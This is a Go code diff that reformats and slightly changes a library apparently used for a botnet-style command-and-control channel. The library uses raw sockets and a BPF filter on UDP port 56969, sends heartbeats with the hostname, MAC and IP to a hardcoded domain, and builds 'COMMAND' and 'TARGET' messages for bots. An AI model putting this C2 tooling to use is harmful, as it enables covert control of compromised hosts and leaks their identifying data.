@@ -9,8 +9,8 @@ import (
 	"log"
 	"net"
 	"os"
-	"strings"
 	"strconv"
+	"strings"
 
 	"golang.org/x/net/bpf"
 	"golang.org/x/sys/unix"
@@ -23,26 +23,26 @@ import (
 // Generate with tcpdump udp and port 56969 -dd
 // or whatever filter you would like to generate
 var FilterRaw = []bpf.RawInstruction{
-	{ 0x28, 0, 0, 0x0000000c },
-	{ 0x15, 0, 9, 0x00000800 },
-	{ 0x30, 0, 0, 0x00000017 },
-	{ 0x15, 0, 15, 0x00000011 },
-	{ 0x28, 0, 0, 0x00000014 },
-	{ 0x45, 13, 0, 0x00001fff },
-	{ 0xb1, 0, 0, 0x0000000e },
-	{ 0x48, 0, 0, 0x0000000e },
-	{ 0x15, 9, 0, 0x000015a6 },
-	{ 0x48, 0, 0, 0x00000010 },
-	{ 0x15, 7, 8, 0x000015a6 },
-	{ 0x15, 0, 7, 0x000086dd },
-	{ 0x30, 0, 0, 0x00000014 },
-	{ 0x15, 0, 5, 0x00000011 },
-	{ 0x28, 0, 0, 0x00000036 },
-	{ 0x15, 2, 0, 0x000015a6 },
-	{ 0x28, 0, 0, 0x00000038 },
-	{ 0x15, 0, 1, 0x000015a6 },
-	{ 0x6, 0, 0, 0x00040000 },
-	{ 0x6, 0, 0, 0x00000000 },
+	{0x28, 0, 0, 0x0000000c},
+	{0x15, 0, 9, 0x00000800},
+	{0x30, 0, 0, 0x00000017},
+	{0x15, 0, 15, 0x00000011},
+	{0x28, 0, 0, 0x00000014},
+	{0x45, 13, 0, 0x00001fff},
+	{0xb1, 0, 0, 0x0000000e},
+	{0x48, 0, 0, 0x0000000e},
+	{0x15, 9, 0, 0x000015a6},
+	{0x48, 0, 0, 0x00000010},
+	{0x15, 7, 8, 0x000015a6},
+	{0x15, 0, 7, 0x000086dd},
+	{0x30, 0, 0, 0x00000014},
+	{0x15, 0, 5, 0x00000011},
+	{0x28, 0, 0, 0x00000036},
+	{0x15, 2, 0, 0x000015a6},
+	{0x28, 0, 0, 0x00000038},
+	{0x15, 0, 1, 0x000015a6},
+	{0x6, 0, 0, 0x00040000},
+	{0x6, 0, 0, 0x00000000},
 }
 
 // Function to do this err checking repeatedly
@@ -152,9 +152,9 @@ func ServerReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, error) {
 	// numBytes	--> Number of bytes
 	// err	--> Error you say?
 	numBytes, err := vm.Run(data)
-    if err != nil {
-        return nil, fmt.Errorf("bpf filter failed: %w", err)
-    }
+	if err != nil {
+		return nil, fmt.Errorf("bpf filter failed: %w", err)
+	}
 	if numBytes == 0 {
 		return nil, nil // numBytes == 0 means filter rejected the packet
 	}
@@ -212,7 +212,7 @@ func ClientReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 
 	// Filter packet?
 	// numBytes	--> Number of bytes
-	// err	--> Error 
+	// err	--> Error
 	numBytes, err := vm.Run(data)
 	checkEr(err)
 	if numBytes == 0 {
@@ -240,6 +240,7 @@ func ClientReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
+//
 //	for binding the socket to an interface
 //
 // ifaceInfo	--> net.Interface pointer
@@ -264,6 +265,7 @@ func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
 }
 
 // SendPacket sends a packet using a provided
+//
 //	socket file descriptor (fd)
 //
 // fd 			--> The file descriptor for the socket to use
@@ -282,7 +284,8 @@ func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, p
 }
 
 // CreatePacket takes a net.Interface pointer to access
-// 	things like the MAC Address... and yeah... the MAC Address
+//
+//	things like the MAC Address... and yeah... the MAC Address
 //
 // ifaceInfo	--> pointer to a net.Interface
 //
@@ -334,7 +337,9 @@ func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
 }
 
 // CreateBPFVM creates a BPF VM that contains a BPF program
-// 	given by the user in the form of "[]bpf.RawInstruction".
+//
+//	given by the user in the form of "[]bpf.RawInstruction".
+//
 // You can create this by using "tcpdump -dd [your filter here]"
 //
 // filter	--> Raw BPF instructions generated from tcpdump
@@ -382,7 +387,7 @@ func getOutboundIP(addr string) net.IP {
 }
 
 func GetIpv4FromDns(ARecord string) (addr string) {
-    // Define domain name
+	// Define domain name
 	host := "digitalocean.keydra.dev"
 
 	ip, _ := net.LookupIP(host)
@@ -396,11 +401,11 @@ func GetIpv4FromDns(ARecord string) (addr string) {
 		for i := 0; i < len(ip[0]); i++ {
 			StrIP += strconv.Itoa((int(ip[0][i])))
 			if i < 3 {
-					StrIP += "."
+				StrIP += "."
 			}
 		}
 	}
-	
+
 	return StrIP
 }
 
@@ -410,7 +415,8 @@ func GetIpv4FromDns(ARecord string) (addr string) {
 // addr		--> The IP you want to be able to reach from an interface
 //
 // Returns	--> *net.Interface struct of outward interface
-//			--> net.IP used for creating a packet
+//
+//	--> net.IP used for creating a packet
 func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
 	outboundIP := getOutboundIP(addr)
 
@@ -450,7 +456,7 @@ func GenerateClientMessage(hostMAC net.HardwareAddr, srcIP net.IP, data string) 
 		log.Fatal("Hostname not found...")
 	}
 
-	message = "CLIENT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String() + " " + data
+	message = "CLIENT" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String() + " " + data
 	lastByte := min(len(message), 508) //  RFC 791 - RTFM
 	message = message[:lastByte]
 
@@ -463,19 +469,19 @@ func GenerateClientHeartbeat(hostMAC net.HardwareAddr, srcIP net.IP) (message st
 		log.Fatal("Hostname not found...")
 	}
 
-	message = "HEARTBEAT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+	message = "HEARTBEAT" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
 
 	return message
 }
 
 // CreateCommand creates the payload for sending commands to bots
 func CreateCommand(cmd string) (command string) {
-	command = "COMMAND: " + cmd
+	command = "COMMAND " + cmd
 	return command
 }
 
 // CreateTargetCommand creates a target command string
 func CreateTargetCommand(cmd string, ip string) (command string) {
-	command = "TARGET: " + ip + " " + cmd
+	command = "TARGET " + ip + " " + cmd
 	return command
 }
